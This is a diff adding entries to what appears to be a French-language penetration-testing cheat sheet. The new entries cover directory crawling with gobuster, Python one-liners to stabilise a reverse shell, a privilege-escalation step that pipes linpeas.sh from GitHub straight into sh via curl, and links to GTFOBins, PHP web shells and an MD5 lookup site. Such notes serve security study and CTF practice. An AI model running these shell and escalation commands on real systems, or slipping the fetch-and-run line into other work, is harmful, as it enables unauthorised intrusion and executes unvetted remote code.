@@ -98,6 +98,9 @@
         
 ##[CRAWLING]    
 
+    -gobuster
+      premiere indexation de repertoires
+      
     -dirb http:// 
       juste pour indexer les repertoires
       
@@ -147,7 +150,23 @@
 
     https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
     https://github.com/flozz/p0wny-shell
-    
+
+    stabiliser shell python :
+      python -c 'import pty;pty.spawn("/bin/bash");'
+      python -c 'import pty; pty.spawn("/bin/bash")'
+      export TERM=xterm
+
+      
+https://github.com/flozz/p0wny-shell
+
+#[PRIVESC]   
+
+    Linpeas pour enum les gtfobins
+      curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+    gtfobins
+      https://gtfobins.github.io/
+
 #[WORDLISTS]
 
     apt -y install seclists (https://github.com/danielmiessler/SecLists)
@@ -160,7 +179,10 @@
 #[SITES UTILES]
     
     Wordpress sécurisation:
-    wpmarmite (https://wpmarmite.com/)
+      wpmarmite (https://wpmarmite.com/)
+
+    MD5 Decrypt
+      https://www.dcode.fr/md5-hash
 
 
 
